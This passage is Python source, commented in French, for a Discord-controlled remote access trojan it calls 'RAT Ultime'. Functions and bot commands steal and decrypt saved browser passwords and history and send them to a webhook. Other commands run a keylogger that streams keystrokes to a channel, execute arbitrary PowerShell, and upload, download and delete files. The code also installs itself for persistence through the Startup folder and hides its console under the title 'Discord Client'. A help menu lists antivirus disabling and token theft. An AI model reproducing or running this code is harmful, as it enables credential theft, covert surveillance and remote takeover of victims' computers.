            login_data_path = os.path.join(browser_path, 'logins.json')
            return steal_tor_passwords(login_data_path)  # Gestion spéciale pour Tor
        else:
            login_data_path = os.path.join(browser_path, 'Login Data')
        
        if not os.path.exists(login_data_path):
            return passwords
        
        # Copie temporaire pour éviter les verrous
        temp_db = os.path.join(browser_path, 'TempLoginData')
        shutil.copy2(login_data_path, temp_db)
        
        # Connexion à la base de données
        import sqlite3
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # Récupère les mots de passe
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        for row in cursor.fetchall():
            url = row[0]
            username = row[1]
            encrypted_password = row[2]
            
            # Déchiffrement du mot de passe
            try:
                decrypted_password = win32crypt.CryptUnprotectData(
                    encrypted_password, None, None, None, 0
                )[1].decode('utf-8')
                
                if decrypted_password:
                    passwords.append(f"URL: {url}\nUtilisateur: {username}\nMot de passe: {decrypted_password}\n")
            except:
                continue
        
        conn.close()
        os.remove(temp_db)
        return passwords
        
    except Exception as e:
        return [f"Erreur: {str(e)}"]

def steal_tor_passwords(login_data_path):
    """Vol les mots de passe de Tor (format JSON)"""
    try:
        passwords = []
        
        if not os.path.exists(login_data_path):
            return passwords
        
        with open(login_data_path, 'r', encoding='utf-8') as f:
            data = json.load(f)
            
        for entry in data.get('logins', []):
            url = entry.get('hostname', '')
            username = entry.get('username', '')
            encrypted_password = entry.get('password', '')
            
            # Tor utilise un chiffrement différent, tentative de déchiffrement
            try:
                # Cette partie nécessiterait une implémentation spécifique pour Tor
                decrypted_password = "Mot de passe Tor (déchiffrement complexe)"
                passwords.append(f"URL: {url}\nUtilisateur: {username}\nMot de passe: {decrypted_password}\n")
            except:
                continue
        
        return passwords
        
    except Exception as e:
        return [f"Erreur Tor: {str(e)}"]

def steal_history(browser_name, browser_path):
    """Vol l'historique de navigation d'un navigateur spécifique"""
    try:
        history = []
        
        # Chemins des bases de données selon le navigateur
        if browser_name == 'Tor':
            history_path = os.path.join(browser_path, 'places.sqlite')
        else:
            history_path = os.path.join(browser_path, 'History')
        
        if not os.path.exists(history_path):
            return history
        
        # Copie temporaire
        temp_db = os.path.join(browser_path, 'TempHistory')
        shutil.copy2(history_path, temp_db)
        
        # Connexion à la base de données
        import sqlite3
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # Récupère l'historique (derniers 100 sites)
        cursor.execute("""
            SELECT url, title, last_visit_time 
            FROM urls 
            ORDER BY last_visit_time DESC 
            LIMIT 100
        """)
        
        for row in cursor.fetchall():
            url = row[0]
            title = row[1] or "Sans titre"
            timestamp = row[2]
            
            # Conversion du timestamp Chrome/Edge
            chrome_time = datetime(1601, 1, 1) + timedelta(microseconds=timestamp)
            formatted_time = chrome_time.strftime("%Y-%m-%d %H:%M:%S")
            
            history.append(f"{formatted_time} - {title}\n{url}\n")
        
        conn.close()
        os.remove(temp_db)
        return history
        
    except Exception as e:
        return [f"Erreur: {str(e)}"]

# === COMMANDES POUR TOUS LES NAVIGATEURS ===
@bot.command()
async def passwords(ctx, browser_name=None):
    """Récupère les mots de passe de tous les navigateurs ou d'un navigateur spécifique"""
    try:
        browsers = get_browser_paths()
        results = {}
        
        if browser_name and browser_name in browsers:
            # Un navigateur spécifique demandé
            passwords = steal_passwords(browser_name, browsers[browser_name])
            results[browser_name] = passwords
        else:
            # Tous les navigateurs
            for name, path in browsers.items():
                passwords = steal_passwords(name, path)
                results[name] = passwords
        
        # Envoi des résultats
        message_parts = []
        for browser, passwords in results.items():
            if passwords and not passwords[0].startswith("Erreur"):
                password_text = "\n".join(passwords[:3])  # Limite à 3 par navigateur pour Discord
                message_parts.append(f"🔑 **{browser} - Mots de passe:**\n```{password_text}```")
                
                # Envoie tout au webhook
                all_passwords = "\n".join(passwords)
                send_to_webhook(f"🔑 MOTS DE PASSE {browser.upper()} VOLÉS:\n{all_passwords}")
            else:
                message_parts.append(f"❌ {browser}: Aucun mot de passe trouvé ou erreur d'accès")
        
        if message_parts:
            await ctx.send("\n".join(message_parts))
        else:
            await ctx.send("❌ Aucun navigateur trouvé ou aucun mot de passe accessible")
            
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")

@bot.command()
async def history(ctx, browser_name=None):
    """Récupère l'historique de tous les navigateurs ou d'un navigateur spécifique"""
    try:
        browsers = get_browser_paths()
        results = {}
        
        if browser_name and browser_name in browsers:
            # Un navigateur spécifique demandé
            history = steal_history(browser_name, browsers[browser_name])
            results[browser_name] = history
        else:
            # Tous les navigateurs
            for name, path in browsers.items():
                history = steal_history(name, path)
                results[name] = history
        
        # Envoi des résultats
        message_parts = []
        for browser, history in results.items():
            if history and not history[0].startswith("Erreur"):
                history_text = "\n".join(history[:3])  # Limite à 3 par navigateur pour Discord
                message_parts.append(f"🌐 **{browser} - Historique (3 derniers sites):**\n```{history_text}```")
                
                # Envoie tout au webhook
                all_history = "\n".join(history)
                send_to_webhook(f"🌐 HISTORIQUE {browser.upper()} VOLÉ:\n{all_history}")
            else:
                message_parts.append(f"❌ {browser}: Historique non trouvé ou erreur d'accès")
        
        if message_parts:
            await ctx.send("\n".join(message_parts))
        else:
            await ctx.send("❌ Aucun navigateur trouvé ou aucun historique accessible")
            
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")

@bot.command()
async def browsers(ctx):
    """Affiche la liste des navigateurs détectés sur le système"""
    try:
        browsers = get_browser_paths()
        if browsers:
            browser_list = "\n".join([f"• {browser}" for browser in browsers.keys()])
            await ctx.send(f"🌐 **Navigateurs détectés:**\n{browser_list}")
        else:
            await ctx.send("❌ Aucun navigateur compatible détecté")
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")


@bot.command()
async def volume(ctx, level: int):
    """Change le volume (0-100)"""
    try:
        if os.name == 'nt':
            # Méthode PowerShell pour changer le volume
            ps_command = f"""
            $wshShell = new-object -com wscript.shell
            for ($i = 0; $i -lt {abs(level//2)}; $i++) {{
                if ({level} -gt 50) {{
                    $wshShell.SendKeys([char]175)
                }} else {{
                    $wshShell.SendKeys([char]174)
                }}
            }}
            """
            subprocess.run(["powershell", "-Command", ps_command], capture_output=True)
            await ctx.send(f"🔊 Volume réglé à {level}%")
        else:
            await ctx.send("❌ Commande volume seulement supportée sur Windows")
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")


@bot.command()
async def mute(ctx):
    """Coupe le son"""
    try:
        if os.name == 'nt':
            # Méthode PowerShell pour couper le son
            ps_command = """
            $wshShell = new-object -com wscript.shell
            $wshShell.SendKeys([char]173)
            """
            subprocess.run(["powershell", "-Command", ps_command], capture_output=True)
            await ctx.send("🔇 Son coupé")
        else:
            await ctx.send("❌ Commande mute seulement supportée sur Windows")
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")

@bot.command()
async def unmute(ctx):
    """Rétablit le son"""
    try:
        if os.name == 'nt':
            # Méthode PowerShell pour réactiver le son
            ps_command = """
            $wshShell = new-object -com wscript.shell
            $wshShell.SendKeys([char]175)
            """
            subprocess.run(["powershell", "-Command", ps_command], capture_output=True)
            await ctx.send("🔊 Son rétabli")
        else:
            await ctx.send("❌ Commande unmute seulement supportée sur Windows")
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")

@bot.command()
async def ls(ctx, path="."):
    """Liste les fichiers d'un dossier"""
    try:
        files = os.listdir(path)
        file_list = "\n".join(files)
        await ctx.send(f"📁 Fichiers dans {path}:\n```{file_list}```")
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")

@bot.command()
async def cd(ctx, path):
    """Change de dossier"""
    try:
        os.chdir(path)
        await ctx.send(f"📂 Dossier changé vers: {os.getcwd()}")
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")

@bot.command()
async def download(ctx, file_path):
    """Télécharge un fichier"""
    try:
        if os.path.exists(file_path):
            await ctx.send(file=discord.File(file_path))
        else:
            await ctx.send("❌ Fichier non trouvé")
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")

@bot.command()
async def upload(ctx):
    """Upload un fichier (joindre le fichier)"""
    try:
        if ctx.message.attachments:
            attachment = ctx.message.attachments[0]
            await attachment.save(attachment.filename)
            await ctx.send(f"📤 Fichier {attachment.filename} uploadé avec succès")
        else:
            await ctx.send("❌ Veuillez joindre un fichier à uploader")
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")

@bot.command()
async def delete(ctx, file_path):
    """Supprime un fichier"""
    try:
        if os.path.exists(file_path):
            os.remove(file_path)
            await ctx.send(f"🗑️ Fichier {file_path} supprimé")
        else:
            await ctx.send("❌ Fichier non trouvé")
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")

@bot.command()
async def error(ctx, *, message="Erreur système critique"):
    """Affiche un message d'erreur style Windows à l'écran"""
    try:
        if platform.system() == "Windows":
            # Utilise msg.exe pour afficher un popup système
            error_msg = f"""
🚨 {message} 🚨

Code d'erreur: 0x{random.randint(1000, 9999):X}
Processus: svchost.exe (PID: {random.randint(1000, 9999)})
Module: ntoskrnl.exe+0x{random.randint(1000, 9999):X}

Redémarrez votre système et contactez votre administrateur.
"""
            # Encode le message pour les caractères spéciaux
            encoded_msg = error_msg.replace('"', '\\"').replace('\n', ' ')
            
            # Affiche le message popup
            subprocess.run(f'msg * "{encoded_msg}"', shell=True)
            
            # Joue un son d'erreur
            try:
                import winsound
                winsound.MessageBeep(winsound.MB_ICONHAND)  # Son d'erreur
            except:
                pass
            
            await ctx.send(f"💥 Message d'erreur envoyé: {message}")
        else:
            await ctx.send("❌ Windows seulement pour les messages popup")
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")
@bot.command()
async def bsod(ctx):
    """Simule un écran bleu de la mort (faux)"""
    try:
        if platform.system() == "Windows":
            # Crée un faux écran bleu en plein écran
            bsod_html = """
<html>
<body style="background: #0000aa; color: white; font-family: sans-serif; margin: 0; padding: 50px; font-size: 24px;">
<div style="text-align: center;">
    <div style="font-size: 80px; margin-bottom: 30px;">:-(</div>
    <div style="font-weight: bold; margin-bottom: 20px;">Votre PC a rencontré un problème et doit redémarrer.</div>
    <div>Nous recueillons quelques informations sur l'erreur, puis nous redémarrerons pour vous.</div>
    <div style="margin-top: 30px;">0% complet</div>
    <div style="margin-top: 10px;">
        <div style="background: #5555ff; height: 20px; width: 300px; margin: 0 auto; border-radius: 10px;"></div>
    </div>
    <div style="margin-top: 50px; font-size: 16px;">
        Pour plus d'informations sur ce problème et les correctifs possibles, visitez :<br>
        https://www.windows.com/stopcode
    </div>
    <div style="margin-top: 20px; font-size: 16px;">
        Code d'arrêt : CRITICAL_PROCESS_DIED
    </div>
</div>
</body>
</html>
"""
            # Sauvegarde le faux BSOD
            with open("bsod.html", "w", encoding="utf-8") as f:
                f.write(bsod_html)
            
            # Ouvre en plein écran
            subprocess.Popen(['cmd', '/c', 'start', 'msedge', '--kiosk', '--fullscreen', os.path.abspath("bsod.html")])
            
            await ctx.send("💙 Faux écran bleu activé!")
        else:
            await ctx.send("❌ Windows seulement")
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")

@bot.command()
async def execute(ctx, file_path):
    """Exécute un fichier"""
    try:
        if os.path.exists(file_path):
            subprocess.Popen(file_path, shell=True)
            await ctx.send(f"🚀 Fichier {file_path} exécuté")
        else:
            await ctx.send("❌ Fichier non trouvé")
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")

@bot.command()
async def keylog_start(ctx):
    """Démarre le keylogger"""
    try:
        start_keylogger()
        await ctx.send("⌨️ Keylogger démarré")
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")

@bot.command()
async def keylog_stop(ctx):
    """Arrête le keylogger"""
    try:
        stop_keylogger()
        await ctx.send("⌨️ Keylogger arrêté")
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")

@bot.command()
async def keylog_status(ctx):
    """Statut du keylogger"""
    status = "ACTIF" if is_logging else "INACTIF"
    duration = int(time.time() - log_start_time) if is_logging else 0
    await ctx.send(f"⌨️ Keylogger: {status}\n⏱️ Durée: {duration}s\n📝 Frappes en mémoire: {len(key_logs)}")

@bot.command()
async def powershell(ctx, *, command):
    """Exécute une commande PowerShell"""
    try:
        result = subprocess.run(["powershell", "-Command", command], 
                              capture_output=True, text=True, timeout=30)
        
        output = result.stdout if result.stdout else "(aucune sortie)"
        error = result.stderr if result.stderr else "(aucune erreur)"
        
        response = f"**💻 Commande PowerShell:** {command}\n**📤 Sortie:**\n```{output[:1500]}```"
        if result.stderr:
            response += f"\n**❌ Erreurs:**\n```{error[:1500]}```"
        
        await ctx.send(response)
    except subprocess.TimeoutExpired:
        await ctx.send("⏰ La commande a expiré (timeout après 30 secondes)")
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")

@bot.command()
async def persist(ctx):
    """Rend le bot persistant au démarrage"""
    try:
        if os.name == 'nt':
            startup_path = os.path.join(os.getenv('APPDATA'), 
                                      'Microsoft', 'Windows', 'Start Menu', 
                                      'Programs', 'Startup')
            script_path = os.path.abspath(sys.argv[0])
            
            # Crée un fichier batch pour lancer le script
            bat_path = os.path.join(startup_path, "discord_bot.bat")
            with open(bat_path, 'w') as f:
                f.write(f"@echo off\nstart \"Discord Client\" /min \"{sys.executable}\" \"{script_path}\"\nexit\n")
            
            await ctx.send("✅ Persistance activée - Le bot démarrera automatiquement")
        else:
            await ctx.send("❌ Persistance seulement supportée sur Windows")
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")

@bot.command()
async def unpersist(ctx):
    """Supprime la persistance"""
    try:
        if os.name == 'nt':
            startup_path = os.path.join(os.getenv('APPDATA'), 
                                      'Microsoft', 'Windows', 'Start Menu', 
                                      'Programs', 'Startup')
            bat_path = os.path.join(startup_path, "discord_bot.bat")
            
            if os.path.exists(bat_path):
                os.remove(bat_path)
                await ctx.send("✅ Persistance désactivée")
            else:
                await ctx.send("ℹ️ Aucune persistance trouvée")
        else:
            await ctx.send("❌ Persistance seulement supportée sur Windows")
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")

@bot.command()
async def kill(ctx):
    """Arrête le bot"""
    await ctx.send("🛑 Arrêt du bot...")
    await bot.close()

# === CORRECTIONS DES COMMANDES EXISTANTES ===
@bot.command()
async def sound(ctx, *, text):
    """Fait parler l'ordinateur"""
    try:
        engine = pyttsx3.init()
        
        # Configure la voix
        voices = engine.getProperty('voices')
        if voices:
            engine.setProperty('voice', voices[0].id)
            engine.setProperty('rate', 150)  # Vitesse de parole
            engine.setProperty('volume', 0.9)  # Volume
        
        # Utilise un thread pour ne pas bloquer
        def speak():
            engine.say(text)
            engine.runAndWait()
        
        thread = threading.Thread(target=speak)
        thread.daemon = True
        thread.start()
        
        await ctx.send(f"🔊 Texte prononcé: {text}")
        
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")

# === COMMANDE AIDE COMPLÈTE ===
@bot.command()
async def aide(ctx):
    """Affiche toutes les commandes"""
    help_text = """
**📋 COMMANDES RAT ULTIME 📋**

**🔧 SYSTÈME**
`!info` - Informations système   `!processus` - Processus
`!ip` - Adresse IP              `!disque` - Espace disque
`!screen` - Capture écran       `!webcam` - Photo webcam
`!sound texte` - Parler         `!click` - Bloque la souris au centre
`!unlock` - Débloque souris 
`!clavier texte` - Écrire       `!cmd commande` - Exécuter CMD
`!ps commande` - PowerShell     `!rec [durée] [fps]` - Enregistrement vidéo
`!crash` - Surcharge le système

**⚡ CONTRÔLE**
`!lock` - Verrouiller PC       `!shutdown` - Éteindre
`!restart` - Redémarrer        `!sleep` - Veille
`!logoff` - Déconnexion        `!volume 0-100` - Volume
`!mute` - Muet                 `!unmute` - Activer son
`!antivirus` - Désactiver antivirus

**🌐 NAVIGATION**
`!site url` - Ouvrir site      `!google recherche` - Recherche Google
`!youtube recherche` - YouTube

**📁 FICHIERS**
`!ls [dossier]` - Lister fichiers `!cd dossier` - Changer dossier
`!download fichier` - Télécharger `!upload` - Uploader (avec fichier)
`!delete fichier` - Supprimer    `!execute fichier` - Exécuter

**🔐 VOL DE DONNÉES**
`!steal` - Vol complet (webhook)
`!password` - Mots de passe Edge `!history` - Historique Edge
`!cookie` - Vol complet (ZIP avec historique, mdp et screenshot)

**🎤 AUDIO**
`!audio secondes` - Enregistrement microphone
`!listen secondes` - Capture audio sortant
`!write texte` - Écrit du texte

**⌨️ KEYLOGGER**
`!keylog_start` - Démarrer    `!keylog_stop` - Arrêter
`!keylog_status` - Statut

**📱 APPLICATIONS**
`!telegram` - Récupère numéro téléphone Telegram
`!tokens` - Tokens Discord 

**😈 FUN & TROLL**
`!error` - Message d'erreur popup `!bsod` - Faux écran bleu
`!disco` - Clignotement écran            `!wall texte` - Change fond d'écran
`!spam` - Ouvre plein de fenêtres        

**⚙️ DIVERS**
`!persist` - Persistance      `!unpersist` - Supprimer persistance
`!kill` - Arrêter le bot

**⚠️ UTILISATION RESPONSABLE REQUISE ⚠️**
"""
    await ctx.send(help_text)
# === FONCTIONS BACKGROUND ===
async def send_keylogs():
    await bot.wait_until_ready()
    while not bot.is_closed():
        await asyncio.sleep(5)
        if is_logging and key_logs and CHANNEL_ID:
            channel = bot.get_channel(CHANNEL_ID)
            if channel and key_logs:
                logs_text = "".join(key_logs)
                if logs_text.strip():
                    await channel.send(f"⌨️ Frappes ({time.time()-log_start_time:.0f}s): ```{logs_text}```")
                    key_logs.clear()

@bot.event
async def on_ready():
    print(f'✅ {bot.user} connecté!')
    start_keylogger()
    
    # Change le nom du processus pour se camoufler
    if platform.system() == "Windows":
        try:
            # Se camoufler en "Discord Client"
            kernel32 = ctypes.windll.kernel32
            kernel32.SetConsoleTitleW("Discord Client")
        except:
            pass
    
    # Envoie un message au webhook au démarrage
    system_info = f"""
🖥️ **Nouvelle connexion RAT**
Utilisateur: {getpass.getuser()}
Machine: {platform.node()}
OS: {platform.system()} {platform.release()}
IP: {socket.gethostbyname(socket.gethostname())}
Heure: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
    """
    send_to_webhook(system_info)

def add_to_startup():
    """Ajoute le bot au démarrage automatique"""
    try:
        startup_path = os.path.join(os.getenv('APPDATA'), 
                                  'Microsoft', 'Windows', 'Start Menu', 
                                  'Programs', 'Startup')
        bat_path = os.path.join(startup_path, "DiscordBot.bat")
        
        exe_path = sys.executable if hasattr(sys, 'frozen') else os.path.abspath(__file__)
        bat_content = f'@echo off\nstart "Discord Client" /min "{exe_path}"\nexit'
        
        with open(bat_path, 'w') as f:
            f.write(bat_content)
        return True
    except:
        return False

def hide_console():
    """Cache la console"""
    if platform.system() == "Windows":
        try:
            kernel32 = ctypes.windll.kernel32
            user32 = ctypes.windll.user32
            
            # Cache la console
            kernel32.SetConsoleTitleW("Discord Client")
            hwnd = kernel32.GetConsoleWindow()
            if hwnd:
                user32.ShowWindow(hwnd, 0)  # 0 = SW_HIDE
        except:
            pass

# === LANCEMENT ===
async def main():
    async with bot:
        bot.loop.create_task(send_keylogs())
        await bot.start('')


if __name__ == "__main__":
    # Cache la console
    hide_console()
    
    # Ajoute automatiquement au démarrage si en .exe
    if hasattr(sys, 'frozen'):
        add_to_startup()
    
    print("🚀 Démarrage du RAT Ultime...")
    print("✅ Keylogger activé | ✅ Webhook configuré")
    print("✅ Vol de données activé | ✅ Persistance activée")
    print("💡 Utilisez !aide pour voir les commandes")
    
    # Masque la console si en .exe
    if hasattr(sys, 'frozen'):
        hide_console()
    
    asyncio.run(main())